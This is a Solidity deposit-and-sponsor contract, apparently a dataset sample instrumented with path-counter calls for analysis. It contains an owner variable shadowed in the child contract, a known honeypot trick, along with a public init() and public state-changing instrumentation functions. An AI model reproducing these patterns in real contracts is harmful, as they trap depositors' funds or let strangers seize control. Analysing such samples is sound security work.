import "./PathCounter.sol";
pragma solidity ^0.4.17;

contract Owned 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    
    int _pc_counter = 0;
struct Uint_init {
    int path_id;
	uint count;
	uint is_init;	
  }
Uint_init  public _pc_current_path;
mapping(uint => uint) _pc_revert_paths;
event _pc_path(int path_id, uint count);
function _pc_init_all_transaction_data(int counter_init_val) public  {
  
	_pc_counter = counter_init_val;

  }
function _pc_inc_counter(int counter_inc) public returns (bool) {
	
	_pc_counter = _pc_counter + counter_inc;

	return false;
	
  }
function _pc_inc_transaction_path_count(int counter_inc) public  {	
	
	_pc_counter = _pc_counter + counter_inc;
	
  }
function _pc_reset_counter(int counter_reset) public  {
		
	_pc_counter = counter_reset;
		
  }
function _pc_flush_path_data() public  {

	emit _pc_path(_pc_counter, 1);

	_pc_counter = 0;
	
  }
function _pc_update_reverted_path_id(uint[] memory path_ids, uint size) public  {
  
	for (uint i=0; i<size; i++) {
	
		_pc_revert_paths[path_ids[i]] = 1;
		
	}	
	
  }


function get_batch_id() external view returns (uint256) { return 1; }

function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;_pc_inc_counter(3);
        }
 else {

}_pc_flush_path_data();
    }
    
    function confirmOwner()
    public
    {_pc_counter = 154;
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
 else {

_pc_inc_counter(-1);}_pc_flush_path_data();
    }
    
    
    function isOwner()
    internal
    
    returns(bool)
    {_pc_inc_counter(156);
_pc_inc_counter(7);
_pc_inc_counter(9);
        _pc_inc_counter(-2);
_pc_inc_counter(2);
_pc_inc_counter(-1);return owner == msg.sender;
    }
    
    function WthdrawAllToCreator()
    public
    payable
    {_pc_counter = 149;
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);_pc_inc_counter(1);
        }
 else {

}_pc_flush_path_data();
    }
    
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);_pc_inc_counter(146);
        }
 else {

_pc_inc_counter(145);}_pc_flush_path_data();
    }
    
    function WthdrawTo(address addr,uint val)
    public
    payable
    {_pc_counter = 141;
        if(msg.sender==creator)
        {
            addr.transfer(val);_pc_inc_counter(1);
        }
 else {

}_pc_flush_path_data();
    }
}

contract EthDeposit is Owned
{
    address public Manager;
    
    address public NewManager;
    
    uint public SponsorsQty;
    
    uint public CharterCapital;
    
    uint public ClientQty;
    
    uint public PrcntRate = 5;
    
    bool paymentsAllowed;
    
    struct Lender
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    
    mapping (address => uint) public Sponsors;
    
    mapping (address => Lender) public Lenders;
    
    event StartOfPayments(address indexed calledFrom, uint time);
    
    event EndOfPayments(address indexed calledFrom, uint time);
    
    function init(address _manager)
    public
    {
        owner = msg.sender;
        Manager = _manager;_pc_counter = _pc_counter + 138;_pc_flush_path_data();
    }
    
    function isManager()
    private
    
    returns (bool)
    {_pc_inc_counter(137);
        _pc_flush_path_data();return(msg.sender==Manager);
    }
    
    function canManage()
    private
    
    returns (bool)
    {_pc_inc_counter(27);
_pc_inc_counter(86);
_pc_inc_counter(56);
        _pc_inc_counter(-4);
_pc_inc_counter(22);
_pc_inc_counter(11);return(msg.sender==Manager||msg.sender==owner);
    }
    
    function ChangeManager(address _newManager)
    public
    {
        if(canManage())
        { 
            NewManager = _newManager;_pc_inc_counter(23);
        }
 else {

}_pc_flush_path_data();
    }

    function ConfirmManager()
    public
    {
        if(msg.sender==NewManager)
        {
            Manager=NewManager;_pc_inc_counter(108);
        }
 else {

_pc_inc_counter(107);}_pc_flush_path_data();
    }
    
    function StartPaymens()
    public
    {
        if(canManage())
        { 
            _pc_inc_counter(11);AuthorizePayments(true);
            _pc_inc_counter(1);StartOfPayments(msg.sender, now);
        }
 else {

}_pc_flush_path_data();
    }
    
    function StopPaymens()
    public
    {_pc_counter = 28;
        if(canManage())
        { 
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
 else {

}_pc_flush_path_data();
    }address owner;
    
    function AuthorizePayments(bool val)
    public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
 else {

}
    }
    
    function SetPrcntRate(uint val)
    public
    {
        if(canManage())
        {
            if(val!=PrcntRate)
            {
                if(val>=1)
                {
                    PrcntRate = val;_pc_inc_counter(1);  
                }
 else {

}
            }
 else {

_pc_inc_counter(-1);}_pc_inc_counter(-2);
        }
 else {

}_pc_flush_path_data();
    }
    
    function()
    public
    payable
    {
        _pc_inc_counter(22);ToSponsor();
    }
    
    function ToSponsor() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Sponsors[msg.sender]==0){
SponsorsQty++;
} else {

_pc_inc_counter(-1);}

            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }  else {

_pc_inc_counter(-2);}_pc_flush_path_data();
  
    }
    
    function WithdrawToSponsor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(CharterCapital>=_wei){
CharterCapital-=_wei;
}
                   else {
CharterCapital=0;_pc_inc_counter(-1);
}_pc_inc_counter(2);
                 }
 else {

}
            }
 else {

}
        }
 else {

_pc_inc_counter(14);}_pc_counter = _pc_counter + -5;_pc_flush_path_data();
    }
    
    function Deposit() 
    public 
    payable
    {
        FixProfit();//fix time inside
        Lenders[msg.sender].Amount += msg.value;_pc_flush_path_data();
    }
    
    function CheckProfit(address addr) 
    public 
     
    returns(uint)
    {
        _pc_inc_counter(2);return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    
    function FixProfit()
    public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
 else {

}
        _pc_inc_counter(6);Lenders[msg.sender].LastLendTime=now;
    }
    
    function WitdrawLenderProfit() 
    public 
    payable
    {_pc_counter = -4;
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);_pc_inc_counter(-5);
        }
 else {

}_pc_counter = _pc_counter + 4;_pc_flush_path_data();
    }
    
}
